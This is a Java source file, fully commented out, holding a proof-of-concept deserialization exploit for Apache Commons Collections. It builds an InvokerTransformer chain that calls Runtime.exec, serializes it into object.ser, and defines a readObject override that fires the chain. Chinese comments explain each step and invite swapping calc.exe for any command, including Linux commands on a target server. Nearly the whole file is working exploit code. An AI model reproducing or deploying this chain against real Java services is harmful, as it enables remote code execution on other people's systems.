package test;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;
//
////用到的commons.collections包
//import org.apache.commons.collections.Transformer;
//import org.apache.commons.collections.functors.ChainedTransformer;
//import org.apache.commons.collections.functors.ConstantTransformer;
//import org.apache.commons.collections.functors.InvokerTransformer;
//import org.apache.commons.collections.map.TransformedMap;
//
//public class DeSerPoc {
//    public static void main(String args[]) throws Exception{
//        Transformer[] transformers = new Transformer[] {
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[] {
//                        String.class, Class[].class }, new Object[] {
//                        "getRuntime", new Class[0] }),
//
//                new InvokerTransformer("invoke", new Class[] {
//                        Object.class, Object[].class }, new Object[] {
//                        null, new Object[0] }),
//　　　　　　　　　// 执行calc.exe，把这里改成自己要执行的命令即可；服务器是linux就以成linux命令
//                new InvokerTransformer("exec", new Class[] {
//                        String.class }, new Object[] {"calc.exe"})
//        };
//
//        Transformer transformedChain = new ChainedTransformer(transformers);
//        Map<String,String> beforeTransformerMap = new HashMap<String,String>();
//        beforeTransformerMap.put("value", "value");
//        Map afterTransformerMap = TransformedMap.decorate(beforeTransformerMap, null, transformedChain);
//        // SerObjRewrite中的setValue能触发afterTransformerMap中的代码的执行
//        SerObjRewrite serObj = new SerObjRewrite();
//        serObj.map = afterTransformerMap;
//        // 将对象写入到object.ser
//        FileOutputStream fos = new FileOutputStream("object.ser");
//        ObjectOutputStream oos = new ObjectOutputStream(fos);
//        oos.writeObject(serObj);
//        oos.close();
//    }
//}
//
//// 重写SerObj类，其实也不叫重写就随便新实现一个序例化类，重写序列化类的readObject方法，该方法在反序列化时会被自动调用
//// 在readObject中调用setValue，setValue能触发注入代码的调用，这正是代码注入的关键
//class SerObjRewrite implements Serializable {
//    // name可有可无，又不是真重写
//    public String name;
//    public Map map;
//
//    private void readObject(java.io.ObjectInputStream in) throws ClassNotFoundException , IOException {
//        in.defaultReadObject();
//        if(map != null){
//            Map.Entry e = (Map.Entry)map.entrySet().iterator().next();
//            e.setValue("400m");
//        }
//    }
//}